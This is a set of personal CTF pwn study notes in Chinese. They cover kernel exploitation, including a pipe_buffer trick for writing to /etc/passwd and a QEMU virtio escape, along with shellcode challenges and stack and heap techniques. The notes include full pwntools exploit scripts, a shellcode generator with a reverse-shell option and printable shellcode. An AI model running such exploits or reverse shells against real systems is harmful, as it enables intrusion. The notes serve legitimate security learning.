# Pwn笔记

## Kernel

kernel pwn题合集。用于纪念我连堆都没搞明白就敢看内核的勇气

- [Virtio-note](https://github.com/nobodyisnobody/write-ups/tree/main/bi0sCTF.2024/pwn/virtio-note)
  - 细分下来应该算qemu逃逸（qemu escape），不过这题pwn的是qemu内置的VirtIO drivers(VirtIO驱动，VirtIO drivers offer a more efficient and direct method of accessing host hardware resources compared to emulated drivers, leading to better performance and lower overhead in virtualized environments)中的作者自定义部分。需要自行写一个在qemu vm里运行的kernel模块，其与virtio backend交互，最终执行shellcode，将flag发回攻击者监听的端口
  - 题目里的bug是OOB读写，bug还是该怎么利用怎么利用，不过除了泄漏heap地址以外，还要泄漏和qemu binary有关的地址（如`qobject_input_type_null`），来计算qemu binary映射基地址。qemu bss段的`tcg_qemu_tb_exec`变量指向qemu内部用来生成jit代码的RWX段，用来写shellcode很方便
  - 看了[官方wp](https://blog.bi0s.in/2024/02/28/Pwn/bi0sCTF24-virtio-note/)，对VirtIO PCI device和内部机制VirtQueues了解得更清楚了些。解法用的是栈迁移加ropchain
- [palindromatic](https://kaligulaarmblessed.github.io/post/palindromatic-biosctf2024/),[官方wp](https://blog.bi0s.in/2024/02/26/Pwn/bi0sCTF24-palindromatic/)
    - UAF+double free。kernel保护（SMEP, SMAP, KPTI 和 KASLR）全开，额外还有CONFIG_STATIC_USERMODEHELPER和[CONFIG_RANDOM_KMALLOC_CACHES](https://sam4k.com/exploring-linux-random-kmalloc-caches/#introducing-random-kmalloc-caches)。前者让攻击者无法通过覆盖modprobe_path提权，后者会复杂一点，简述就是，每个大小的slab中有多个slab caches。当使用kmalloc分配一个object时，它会随机去到一个slab。虽然降低了相似大小的object去往同一个slab cache的可能性，但是不会影响cross-cache攻击。堆喷时多喷几个object即可
    - 尝试复述一下漏洞利用过程的关键部分（还是看[exp](https://gist.github.com/k1R4/bf302fffc2bd5e313a0f7ad789fbd363)会比较好理解）
      - 首先利用程序里的漏洞获取UAF，使得我们仍然可以用程序内的操作控制某个已被free的object（这块已使用cross cache使得下一步能让pipe_buffer覆盖到题目object所在的内存页）
      - 喷射pipe_buffer，希望有一个pipe_buffer获取到与上面那个object相同的内存。这个pipe_buffer标记为victim（注意这个时候我们还没有victim的控制权）
      - free victim。然后再喷一次pipe_buffer，通过某个特征（比如这个victim里的字符和第一次喷射的pipe_buffer们不一样）找到victim，从此就能控制victim了。找到后free全部的pipe_buffer
      - 喷射msg_msgseg结构体（这是个常用的用于泄漏的结构体），希望其中一个msg_msgseg与victim重叠。之后调用[splice](https://man7.org/linux/man-pages/man2/splice.2.html)，将`/etc/passwd`的fd作为fd_in参数，victim作为fd_out参数。这一举动会在ring末尾添加一个pipe_buffer
      - 读取上一步喷射的一堆msg_msgseg，尝试泄漏pipe_buffer的构造（泄漏的不一定是新增的那个pipe_buffer，任意一个都行，主要是获取其结构）。成功后伪造假pipe_buffer，设置PIPE_BUF_FLAG_CAN_MERGE；offset和len为0（改offset和len可以从文件开头开始写）。完成后把假pipe_buffer写入上一步喷射的一堆msg_msgseg。因为有一个msg_msgseg和victim重叠，这一步其实是修改了victim
      - 最后就能往victim里写内容，即往`/etc/passwd`里写
- [mov cr3](https://github.com/cr3mov/cr3ctf-2024/tree/main/challenges/pwn/mov-cr3)
  - kernel-land空间+指定[cr3寄存器](https://blog.csdn.net/SweeNeil/article/details/106171361)任意地址读（AAR）。cr3寄存器简单来说可以用wp里的一句话概括：“CR3 register holds the physical address of Page Map Level (PML) 4 Table address”。PML4 Table指的是这篇[文章](https://zhuanlan.zhihu.com/p/108425561)里介绍的四个有关将虚拟地址转换为物理地址的表（我一直以为PML4 table是一个表，搜了好久都没搜到是个啥玩意，原来是4个表的合称）。这个寄存器通常由系统控制，进程切换时会修改cr3寄存器里的值为要切换进程的物理基地址。如果攻击者可以修改这个寄存器，就可以跨进程读内存。可通过kernel内部的task_struct（从init_task开始，一个个往下找想要进程的结构体）泄漏PML 4 table的虚拟地址，然后参考 https://www.kernel.org/doc/gorman/pdf/understand.pdf 59页的内容将其转换为物理地址
  - Interrupt Descriptor Table (IDT)不被KASLR影响，可用来泄漏kernel基地址
  - 将kernel exp发送到服务器上的工具： https://github.com/pr0cf5/kernel-exploit-sendscript
  - 非预期解： https://gist.github.com/C0nstellati0n/c5657f0c8e6d2ef75c342369ee27a6b5#mov-cr3 。虽然是两个不同的进程，但所在的物理内存都是一样的。所以利用AAR扫描物理内存即可。我顺便记录了在服务器上看到的一段有助于理解的对话

## Shellcode题合集

测试shellcode时可以尝试用c inline assembly（参考 https://stackoverflow.com/questions/61341/is-there-a-way-to-insert-assembly-code-into-c ），语法大致相同，就是引用寄存器时要加个%，如%rdx；每行后面还要加`\n\t`

- [lcode](https://github.com/ImaginaryCTF/ImaginaryCTF-2023-Challenges/tree/main/Pwn/lcode)：可使用最多20种不同byte，且每个byte都是单数；开启沙盒故目标是写orw shellcode。非预期解是写一个获取堆地址的shellcode，然后往那里读rop chain
```
mov bl, 1
xchg eax, ebx
mov bl, 1
xchg edi, ebx
mov bl, 0xdf
mov bh, 0x05
lea edx, [ebx]
mov r15, rsp
lea rsi, [r15]
syscall
xor ebx, ebx
xchg eax, ebx
xor ebx, ebx
xchg edi, ebx
syscall
ret
```
- [Inj](https://github.com/qLuma/TFC-CTF-2023/tree/main/Inj),[wp](https://xa21.netlify.app/blog/tfcctf-2023/inj/)
  - 可以在64位程序里使用`int 0x80`调用32位的系统调用（遵守32位系统调用的调用号和参数传递，有些seccomp会禁掉，只允许64位）。利用`BPF_JUMP`和`BPF_STMT`设置沙盒时也可以分32位和64位系统调用分别设置
  - 只有open和read无write调用时可以通过测信道的方式读取flag。读取flag后，一位一位地遍历flag。若为0，让程序崩溃；若为1，让程序延时（执行另一个read或者执行一个很长的loop）
- [the great escape](https://gerrardtai.com/coding/ductf#the-great-escape)
  - 利用read,openat,nanosleep时间测信道获取flag
- [saas](https://github.com/cscosu/buckeyectf-2023-public/tree/master/pwn-saas),[wp](https://github.com/HAM3131/hacking/tree/main/BuckeyeCTF/pwn/saas)
  - arm Self-modifying shellcode
  - 一些arm学习链接： https://www.davespace.co.uk/arm/introduction-to-arm/immediates.html
- [Babysbx](https://github.com/nobodyisnobody/write-ups/tree/main/Blackhat.MEA.CTF.Finals.2023/pwn/babysbx)
  - xmm系列寄存器里存有大量地址，包括heap，libc和程序。例如从xmm0里拿堆地址：`movd rax, xmm0`
  - 利用seccomp entry value找到堆上的seccomp rule并确定动态地址。seccomp没法检查具体内存地址处的内容，只能保证调用syscall时参数用的是某个地址A。PIE下A的地址随机，但是仍然可以借助搜索seccomp entry value `0x0000000200240015`找到确定的地址
  - 利用shmget和shmat remap内存。效果为修改某段内存的权限。比较冷门的做法， mmap, mprotect, munmap, ptrace都禁掉后还可用这种
  - 汇编引用标签字符串。wp的shellcode里出现了之前没见过的语法：
  ```
  ...
  mov rbx,cmd[rip]
  mov [rdi],rbx
  mov rbx,cmd+8[rip]
  mov [rdi+8],rbx
  ...

  cmd:
    .string "/readflag"
  ```
  这个`cmd[rip]`和`cmd+8[rip]`不懂什么意思，调试后发现执行时分别变成了`mov rbx, qword ptr [rip + 0x19]`和`mov rbx, qword ptr [rip + 0x17]`。似乎是一种根据rip来引用字符串的固定做法？
  - [预期解](https://gist.github.com/C0nstellati0n/c5657f0c8e6d2ef75c342369ee27a6b5#babysbx)使用mremap
- [message](https://chovid99.github.io/posts/tcp1p-ctf-2023/#message)
  - 利用pwntools shellcraft生成open+getdents64+write shellcode获取当前目录下全部文件的文件名
  - 更详细的解析： https://www.mspi.eu/blog/security/ctf/2023/10/15/tcp1p-ctf-writeups.html#message
- [FunChannel](https://www.youtube.com/watch?v=RaYU3hN88DA)
  - pwntools编写shellcode+getdents获取文件名+openat/read（无write）侧信道读内容
  - js socket+手写汇编： https://gist.github.com/adrian154/40df5ac94ed27a5e7b0b1e040863b50c
- [Orxw](https://github.com/nobodyisnobody/write-ups/tree/main/Balsn.CTF.2021/pwn/orxw)
  - 一种通过侧信道读取flag的手段。同样是只有read等函数没有write等输出函数。将要泄露的字符读到`/dev/ptmx`的后面，然后加上某个偏移。若偏移对了，`/dev/ptmx`的最后就是`\x00`，打开这个设备时程序会延时；而偏移错误则会导致设备名错误，程序立即终止
- [Protector](https://ptr-yudai.hatenablog.com/entry/2024/01/23/174849#Protector-12-solves)
  - 32位rop+shellcode。使用rop爆破ASLR末端字节并覆盖read的got表为mprotect，mprotect修改bss段执行权限后栈迁移到bss段执行shellcode（open+getdents+read+write+exit）
  - 在高版本的linux机器下，ASLR似乎被削弱了。参考 https://zolutal.github.io/aslrnt/ ，结论是在ext4, ext2, btrfs, xfs和fuse文件系统下，大于2MB的64位binary的ASLR位数从28降到了19；大于2MB的32位binary直接失去了ASLR
- [Hoshmonstar](https://github.com/mmm-team/public-writeups/tree/main/rwctf2024/hoshmonstar)
  - 计算shellcode本身的HMAC-CRC64值，且可同时在RISC-V, AARCH64 和 x86-64下运行。技巧是利用[Barrett reduction](https://en.wikipedia.org/wiki/Barrett_reduction)缩减模运算所需要的代码长度。其他做法： 
    - https://gist.github.com/Riatre/e8eb949da91b650ea27ed6dbebeb3912
    - https://gist.github.com/TethysSvensson/067589b37c473ce2dce9270a64c8624d
- [Five](https://github.com/tamuctf/tamuctf-2024/tree/master/pwn/five)
  - 仅用5个字节构造shellcode并getshell。只靠5个字节肯定不可能，这种题一般都要利用执行shellcode时寄存器的状态（比如`xchg rdx, rsi; syscall`，交换特定的两个寄存器后可以直接执行read syscall）和程序里自带的代码。这题利用了mmap的一个性质：若mmap第一个参数指定的地址已经是一块被映射的内存，这个参数会被看成null。这种情况下，mmap会自行挑选一块空闲的内存，这块内存与libc的偏移固定
  - 汇编里的relative jump最大偏移是一个有符号的32-bit整数。超出这个数字就没法做相对跳转了
- [Janky](https://github.com/tamuctf/tamuctf-2024/tree/master/pwn/janky)
  - 要求shellcode反编译后的每个指令都以j开头。能用的指令只有jmp，可以利用jmp的目标立即数实现RCE。这块得看wp才好理解，具体是，jmp指令后面的立即数最多4个字节，那么可以将shellcode分成多个部分，每个部分长4个字节，写成立即数跟在jmp后面。然后利用错位jmp，跳过开头的jmp指令，直接跳到立即数部分，就能执行这些立即数代表的shellcode了
  - 大佬写的自动化脚本： https://github.com/9x14S/jmp-encoder
- [baby-sandbox](https://unvariant.pages.dev/writeups/amateursctf-2024/pwn-baby-sandbox/)
  - 可以使用sysenter来调用syscall。只是使用sysenter前，rbp和其他参数要指向可读地址；且这个指令只能在64位的intel处理器上用
  - wp里提到了vector registers（以后写shellcode可以注意下，说不定直接就非预期简单解了）和侧信道解法
  - 更详细wp： https://hyggehalcyon.gitbook.io/page/ctfs/2024/amateursctf#baby-sandbox
- [randomness](https://github.com/cr3mov/cr3ctf-2024/tree/main/challenges/pwn/randomness)
  - 每8个字节的shellcode的最后一个字节会被随机数字异或。预期解是将rdi设为0，然后只用7个字节跳转到调用srand的地方。这样就能知道接下来的随机数了
  - 但我记这道题主要还是因为这个非预期解: https://gist.github.com/C0nstellati0n/c5657f0c8e6d2ef75c342369ee27a6b5#randomness 。我们可以执行任意多个长度为5字节的shellcode，只需要在最后拼接上长为2字节的相对jmp，就能跳过接下来被随机化的字节，到下一个5字节指令

1. 程序关闭标准输出会导致getshell后无法得到cat flag的输出。这时可以用命令`exec 1>&0`将标准输出重定向到标准输入，再执行cat flag就能看见了。因为默认打开一个终端后，0，1，2（标准输入，标准输出，标准错误）都指向同一个位置也就是当前终端。详情见这篇[文章](https://blog.csdn.net/xirenwang/article/details/104139866)。例题：[wustctf2020_closed](https://buuoj.cn/challenges#wustctf2020_closed)
2. 做菜单类堆题时，添加堆块的函数一般是最重要的，需要通过分析函数来构建出程序对堆块的安排。比如有些笔记管理题会把笔记名称放一个堆中，笔记内容放另一个堆中，再用一个列表记录指针。了解程序是怎么安排堆后才能根据漏洞制定利用计划。如果分析不出来，用gdb调试对着看会好很多。例题：[babyfengshui](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/6%E7%BA%A7/Pwn/babyfengshui.md)
3. 32位利用A和%p计算格式化字符串偏移+$hn按字节改got表。例题：[axb_2019_fmt32](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/BUUCTF/Pwn/axb_2019_fmt32.md)
4. pwntools生成shellcode

适用于linux。不过我到现在还没见过windows的pwn，可能是windows考的不多吧。

```python
from pwn import *
arch=input("arch? i386/amd64: ")
context(log_level = 'debug', arch = arch, os = 'linux')
choice=input("shell/orw/reverse: ")[:-1]
if choice=="shell":
    shellcode=asm(shellcraft.sh())
    print(shellcode)
elif choice=="reverse":
    ip = input("IP: ")[:-1]
    port=int(input('port: ')[:-1])
    print(asm(shellcraft.connect(ip, port) + shellcraft.dupsh()))
else:
    mmap_addr = int(input("hex addr: "),16)
    filename=input("filename: ")
    length=int(input("length(in decimal): "))
    shellcode = shellcraft.open(filename)
    shellcode += shellcraft.read(3, mmap_addr, length)
    shellcode += shellcraft.write(1, mmap_addr, length)
    print(asm(shellcode))
```

- 64位9字节read shellcode：`xor eax,eax;xor edi,edi;mov rdx,r10;syscall`,结果是`b'\x82QN".\x08\xc3e\x95'`。

6. pwn 栈题模板

## 64位

- ret2libc+格式化字符串绕canary:[bjdctf_2020_babyrop2](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/BUUCTF/Pwn/bjdctf_2020_babyrop2.md)。

- ropchain getshell+溢出绕canary:[rop64](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/moectf/Pwn/rop64.md)。

- ret2libc:[ret2libc](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/moectf/Pwn/ret2libc.md)
- 程序给出buf地址的栈迁移:[actf_2019_babystack](https://blog.csdn.net/mcmuyanga/article/details/112801732)

```python
from pwn import *
context.log_level='debug'
p=remote("node4.buuoj.cn",28412)
leave_ret=0x0000000000400a18
puts_plt=0x400730
puts_got=0x601020
main=0x4008f6
pop_rdi=0x0000000000400ad3
p.sendlineafter(">",str(0xe0))
p.recvuntil('0x')
stack_addr=int(p.recv(12),16)
print(hex(stack_addr))
payload=b'a'*8+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main)
payload+=b'a'*(0xd0-len(payload))  #0xd0是buf距离rbp的偏移
payload+=p64(stack_addr)+p64(leave_ret)
p.sendafter(">",payload) #栈迁移提的payload永远用send发送
puts_addr=u64(p.recvuntil('\x7f')[-6:].ljust(8,b'\x00'))
libc_base=puts_addr-526784
one_gadget=libc_base+0x4f2c5
p.sendlineafter(">",str(0xe0))
p.recvuntil('0x')
stack_addr=int(p.recv(12),16)
payload=b'a'*8+p64(one_gadget)
payload+=b'a'*(0xd0-len(payload))
payload+=p64(stack_addr)+p64(leave_ret)
p.sendafter(">",payload)
p.interactive()
```

## 32位

- ret2libc:[pwn-200](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/4%E7%BA%A7/Pwn/pwn-200.md)。

```python
from pwn import *
context.log_level='debug'
write_plt=0x08048370
write_got=0x0804a01c
ret_addr=0x0804847b
payload=b'a'*0x8c+p32(write_plt)+p32(ret_addr)+p32(1)+p32(write_got)+p32(4)
p=remote("node4.buuoj.cn",26320)
p.sendline(payload)
write_addr=u32(p.recv(4))
system_offset=239936
write_offset=869312
bin_sh_offset=0x0015902b
libc_base=write_addr-write_offset
payload=b'a'*0x8c+p32(libc_base+system_offset)+p32(ret_addr)+p32(libc_base+bin_sh_offset)
p.sendline(payload)
p.interactive()
```

- 栈迁移+ret2libc:[[Black Watch 入群题]PWN](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/BUUCTF/Pwn/%5BBlack%20Watch%20%E5%85%A5%E7%BE%A4%E9%A2%98%5DPWN.md)

- 栈迁移:[ciscn_2019_es_2](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/BUUCTF/Pwn/ciscn_2019_es_2.md)

栈迁移分很多种情况。第一种情况：`偏移+栈迁移目标地址-4+leave_ret`，同时目标地址直接写ropchain。第二种情况：`偏移+栈迁移目标地址+leave_ret`，目标地址先根据程序是多少位的填充4或者8个字节，再写ropchain。第三种情况，迁移的目标地址离一些重要地址比较近，比如got表，这时候就要留出一些位置，`偏移+栈迁移目标地址-0xd0+leave_ret`，目标地址先写0xd0+4个偏移再写ropchain；或者`偏移+栈迁移目标地址+leave_ret`，但是目标地址的ropchain前面加上若干个ret，抬高栈。例题：[gyctf_2020_borrowstack](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/BUUCTF/Pwn/gyctf_2020_borrowstack.md)。栈迁移的目标是让rsp/esp到我们控制的地址上去，不是只有leave;ret可以实现这个效果。假如有类似`mov rsp, rbp ; pop rbp ; ret`的gadget，一次就能迁移成功。

- 菜单类栈溢出题+canary绕过+ret2libc

```python
from pwn import *
context.log_level='debug'
context(arch='arm64')   #因为下方使用了flat，故此处一定要根据程序的位数填写，这个是64位，32位是i386。如果填写错误会导致下方的flag出错。
p=remote('node4.buuoj.cn',27351)
def Store(content):
    p.recvuntil('>>')
    p.sendline('1')
    p.sendline(content)
 
def Print():
    p.recvuntil('>>')
    p.sendline('2')
 
def Quit():
	p.recvuntil('>>')
	p.sendline('3')
puts_plt=0x00400690
puts_got=0x00600fa8
pop_rdi=0x0000000000400a93
main=0x00400908
payload=b'a'*0x88
Store(payload)
Print()
p.recvuntil('a\n')
canary=p.recv(7).rjust(8,b'\x00')
print(canary)
payload=flat([b'a'*0x88,canary,0,pop_rdi,puts_got,puts_plt,main])
Store(payload)
Quit()
p.recv()
puts=u64(p.recv(6).ljust(8,b'\x00'))
puts_offset=456336
libc_base=puts-puts_offset
binsh=1625431+libc_base
system=283536+libc_base
payload=flat([b'a'*0x88,canary,0,pop_rdi,binsh,system,main])
Store(payload)
Quit()
p.interactive()
```

- srop基础利用。例题:[ciscn_2019_es_7](../../CTF/BUUCTF/Pwn/ciscn_2019_es_7.md)

7. pwntools得到libc偏移

承接rop题模板，给出做题时常见的偏移，上面的脚本中xxx_offset就是这么来的。至于为什么要多此一举打印出来，全是因为我没配置好linux环境。配置好的各位直接要`libc.sym['xxx]`那段就行了。

```python
from pwn import *
path="libc.so.6"
libc=ELF(path)
context.arch = libc.arch
print(f"system:{libc.sym['system']}")
print(f"write:{libc.sym['write']}")
print(f"puts:{libc.sym['puts']}")
print(f"/bin/sh:{libc.search(b'/bin/sh').__next__()}")
print(f"free:{libc.sym['free']}")
print(f"__malloc_hook:{libc.symbols['__malloc_hook']}")
print(f"realloc:{libc.symbols['realloc']}")
print(f"printf:{libc.symbols['printf']}")
print(f"__free_hook:{libc.sym['__free_hook']}")
print(f"atoi:{libc.sym['atoi']}")
print(f"__environ:{libc.sym['__environ']}")
print(f"__libc_start_main:{libc.symbols['__libc_start_main']}")
print(f"_IO_2_1_stdin_:{libc.sym['_IO_2_1_stdin_']}")
print(f"setbuffer:{libc.sym['setbuffer']}")
print(f"_IO_list_all: {libc.symbols['_IO_list_all']}")
print(f"read: {libc.symbols['read']}")
print(f"open: {libc.symbols['open']}")   
print(f"malloc: {libc.symbols['malloc']}") 
print(f"_IO_2_1_stdout_: {libc.sym['_IO_2_1_stdout_']}")
print(f"_IO_2_1_stderr_: {libc.sym['_IO_2_1_stderr_']}")
print()
print("gadgets:")
print(f"pop rdi;ret: {next(libc.search(asm('pop rdi; ret'), executable=True))}")
print(f"pop rsi;ret: {next(libc.search(asm('pop rsi; ret'), executable=True))}")
print(f"ret: {next(libc.search(asm('ret'), executable=True))}")                                                      
```

8. pwn heap题模板

这里暂时记录一些学习链接，等我有空了会把它们都看一遍然后写个总结（真的会吗？）
- [house of pig](https://www.anquanke.com/post/id/242640)
- [House OF Kiwi](https://www.anquanke.com/post/id/235598)
- [House _OF _Emma](https://www.anquanke.com/post/id/260614)

## 64位

- unsorted bin attack:[hitcontraining_magicheap](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/BUUCTF/Pwn/hitcontraining_magicheap.md)
- Chunk Extend and Overlapping+off by one:[hitcontraining_heapcreator](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/BUUCTF/Pwn/hitcontraining_heapcreator.md)
- 利用Chunk Extend and Overlapping配合unsorted bin泄露地址+fastbin attack修改__malloc_hook:[0ctf_2017_babyheap](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/BUUCTF/Pwn/0ctf_2017_babyheap.md)
- one_gadget失效时利用realloc_hook调整栈+Chunk Extend and Overlapping配合unsorted bin泄露地址+fastbin attack。例题:[roarctf_2019_easy_pwn](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/BUUCTF/Pwn/roarctf_2019_easy_pwn.md)
- unlink更改got表。例题:[hitcontraining_unlink](../../CTF/BUUCTF/Pwn/hitcontraining_unlink.md)
- house of force任意地址写。例题:[hitcontraining_bamboobox](../../CTF/BUUCTF/Pwn/hitcontraining_bamboobox.md)
- uaf改free_hook为system+tcache dup。例题:[ciscn_2019_es_1](../../CTF/BUUCTF/Pwn/ciscn_2019_es_1.md)
- off by one+unlink+格式化字符串泄露地址。例题:[axb_2019_heap](../../CTF/BUUCTF/Pwn/axb_2019_heap.md)
- 劫持_IO_2_1_stdin_结构体里的_fileno使其读取制定文件而不是stdin+只能泄露地址后4字节的解决办法。例题:[](../../CTF/BUUCTF/Pwn/ciscn_2019_final_2.md)
- off by null+Chunk Extend and Overlapping+tcache dup。例题:[hitcon_2018_children_tcache](../../CTF/BUUCTF/Pwn/hitcon_2018_children_tcache.md)
- house of orange+FSOP。例题:[houseoforange_hitcon_2016](../../CTF/BUUCTF/Pwn/houseoforange_hitcon_2016.md)

## 32位

- uaf更改heap数组函数指针:[hacknote](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/6%E7%BA%A7/Pwn/hacknote.md)
- uaf修改程序功能函数指针。例题：[ciscn_2019_n_3](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/BUUCTF/Pwn/ciscn_2019_n_3.md)


9. 栈溢出[计算偏移量](https://blog.csdn.net/weixin_62675330/article/details/123344386)（gdb，gdb-peda,pwntools cyclic,ida)
10.  手写shellcode。当pwntools自动生成的shellcode过长时，就要手动将shellcode长度缩减。例题：[ciscn_2019_s_9](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/BUUCTF/Pwn/ciscn_2019_s_9.md)
11.  32位&64位系统调用及其[系统调用号](https://introspelliam.github.io/2017/08/06/pwn/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E7%BA%A6%E5%AE%9A/)。
12.  pwntools的sendline和send函数效果不同，sendline会默认在发送的内容后面加上个换行符`\n`。有时候使用不同的会有影响，一个不行可以试试另外的。
13.  纯可见字符shellcode。一般的shellcode都有不可见字符，但有时程序要求只能输入可见字符，这时纯可见字符shellcode就派上用场了。详情请看这篇[文章](http://taqini.space/2020/03/31/alpha-shellcode-gen/#alphanumeric-shellcode)，给出linux，amd64的一个可见字符shellcode：

- Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t

例题:[mrctf2020_shellcode_revenge](https://blog.csdn.net/mcmuyanga/article/details/114828207)

14. 基本格式化字符串漏洞。例题:[inndy_echo](../../CTF/BUUCTF/Pwn/inndy_echo.md)
15. 64位格式化字符串泄露地址+改got表。例题:[axb_2019_fmt64](../../CTF/BUUCTF/Pwn/axb_2019_fmt64.md)
16. [blind pwn](https://www.anquanke.com/post/id/196722#h3-15)（盲打），在不给出原程序的情况下尝试打通程序。
17. orw shellcode构造。例题:[[极客大挑战 2019]Not Bad](../../CTF/BUUCTF/Pwn/[极客大挑战%202019]Not%20Bad.md)
18. stack smash泄露栈上内容+environ环境变量计算栈上变量地址。例题:[wdb2018_guess](../../CTF/BUUCTF/Pwn/wdb2018_guess.md)
19. 在c语言中，无符号变量和有符号变量比较时，会将有符号变量转化为无符号变量来比较。可利用这个特点进行整形溢出，如数字为0的时候，(unsigned int)(0-1)就就是非常大的整数。
20. 就算是32位程序，数组取索引`a[1]`仍然是一个索引对应8个字节。
21. use without initialization漏洞。程序malloc后得到指针在free并设null后，同样应该将指针指向的内容置空，否则可能会导致程序逻辑漏洞。例题:[picoctf_2018_are you root](https://github.com/Dvd848/CTFs/blob/master/2018_picoCTF/are%20you%20root.md)
22. calloc不会从tcache bin里取空闲的chunk，而是从fastbin里取，取完后，和malloc一样，如果fastbin里还有剩余的chunk，则全部放到对应的tcache bin里取，采用头插法。头插法会导致chunk->fd被写入heap_x_addr。例题:[gyctf_2020_signin](https://blog.csdn.net/seaaseesa/article/details/104526905)
23. 堆上的格式化字符串漏洞。
- printf的字符串，如果是在堆上，那么就无法在栈上写地址利用%x$hn去修改
- printf会一次性取出所有的偏移的地址，再去修改。不是边写边修改
- 由于ebp寄存器会记录一个栈地址链，所以可以利用这一点特性，爆破修改这个栈地址链的最低字节，然后修改ebp寄存器后4个字节的内容，理想状态下，爆破1个字节即可，而且，所有的地址都是对齐到地址页。
- ALSR : 对于32位的线性地址来说，高四位为全局页表，如果用随机产生会影响对高位内存的映射能力，会产生大量的内存碎片，低12位要考虑页对齐，因而只能有16位来作为偏移量 . 可能不清楚, 举个例子 0x080485AB地址 它只能0x10,0x10的修改. 同时高四位不会被修改, 同时由于页对齐 , 也就意味着只有A 会被随机化. 64位类似.
- %{offest}\$n : 如果有 A->B->C. 那么如果 %{offest}\$n指向A的话, 实际修改的是C.

例题:[xman_2019_format](https://blog.csdn.net/Y_peak/article/details/115327826)

24. ubuntu18中需要[栈平衡](https://blog.csdn.net/qq_41560595/article/details/112161243)（按照16字节对齐）才能正常调用system。例题:[suctf_2018_stack](https://buuoj.cn/challenges#suctf_2018_stack)
- 补充：后来发现read等函数也需要栈对齐（rsp以0结尾），也不仅仅是ubuntu18。可能是从这里往上的libc版本和所有的系统调用都要对齐？
25. 程序在退出时会调用fini_array，因此可以通过改fini_array获取一次循环。需要注意的是，这个数组的内容在再次从start开始执行后又会被修改，由此无法获得无限循环。例题:[ciscn_2019_sw_1](https://blog.csdn.net/wuyvle/article/details/116310454)
26. strcpy 在复制字符串时会拷贝结束符 '\x00'，比如原字符串长8，strcpy会连着末尾的\x00一起拷贝到目标地址，也就是9个字符，易发生off-by-null。
27. 拟态入门。该类题型会给出两个功能完全相同的程序，还有一个裁决程序，fork出这两个程序，并监听着它们的输出。如果两者输出不一样或者一方崩溃，则裁决程序就会kill掉它们两个，要求我们写出两个程序都共用的exp。例题:[强网杯2019 拟态 STKOF](https://blog.csdn.net/seaaseesa/article/details/105407007)
28. realloc函数下的tcache dup+stdout泄露libc地址。realloc函数相比malloc，有4种情况：

① 当ptr == nullptr的时候，相当于malloc(size)， 返回分配到的地址<br>
② 当ptr != nullptr && size == 0的时候，相当于free(ptr)，返回空指针<br>
③ 当size小于原来ptr所指向的内存的大小时，直接缩小，返回ptr指针。被削减的那块内存会被释放，放入对应的bins中去<br>
④ 当size大于原来ptr所指向的内存的大小时，如果原ptr所指向的chunk后面有足够的空间，那么直接在后面扩容，返回ptr指针；如果后面空间不足，先释放ptr所申请的内存，然后试图分配size大小的内存，返回分配后的指针

利用io file的stdout泄露libc地址则要满足下面的条件：

① 设置_flags & _IO_NO_WRITES = 0<br>
② 设置_flags & _IO_CURRENTLY_PUTTING = 1<br>
③ 设置_flags & _IO_IS_APPENDING = 1<br>
④ 将_IO_write_base设置为要泄露的地方

例题1:[roarctf_2019_realloc_magic](https://blog.csdn.net/qq_35078631/article/details/126913140)。例题2:[de1ctf_2019_weapon](https://www.z1r0.top/2021/10/12/de1ctf-2019-weapon/)。例题2是uaf+全保护+无show函数（无法直接泄露地址），且无法直接创建unsorted bin，需要利用uaf和chunk overlap构造出一个unsorted bin里的chunk，然后再爆破io file泄露地址（打stdout）。

29. tcache attack中tcache_perthread_struct的利用。在tcache机制下利用unsorted bin泄露地址时，需要先填满tcache。但有些题会限制free的次数。这时可以尝试利用例如tcache dup这种漏洞，分配到tcache_perthread_struct处，更改tcache bins中chunk的数量和分配地址。tcache_perthread_struct结构体在堆上，大小一般为0x250。它的前64个字节，分别代表0x20\~0x410大小的chunk(包括chunk头)的数量。当超过7（这个值由里面的一个字段决定，如果我们修改这个字段，比如0，就能直接把chunk放入unsorted bin）的时候，再次释放的chunk会被放入到fastbin或者unsorted bin。后面的内存，则分别表示0x20\~0x410大小tcache bins的首地址。首地址如果是一个有效的地址，下一次分配对应大小的chunk会直接从该地址处分配，没有chunk size的检查。例题:[SWPUCTF_2019_p1KkHeap](https://www.cnblogs.com/LynneHuan/p/14589294.html)
30. bss段上的格式化字符串漏洞。非栈上的格式化字符串漏洞与栈上格式化字符串不同，主要区别在于无法直接使用%XXc$XXp + addr，去往指定地址写入内容。一般需要借助地址链完成任意地址写操作。常用的地址链有：rbp指针链、args参数链。如果利用rbp指针链攻击程序返回地址，最后退出函数的时候，需要把rbp指针链恢复为原始状态。和堆上的格式化字符串漏洞一样，都是可以利用ebp的地址链间接修改got等地址。got表通常是0x80开头，先让ebp指向一个指向0x80地址开头的指针（方便修改），下一次再修改ebp就是修改那个指针，改成system即可getshell。例题1:[SWPUCTF_2019_login](https://blog.csdn.net/weixin_46521144/article/details/119567212)(利用ebp链改got表)。例题2:[npuctf_2020_level2](https://www.cnblogs.com/LynneHuan/p/14639168.html)(利用args链改返回地址)
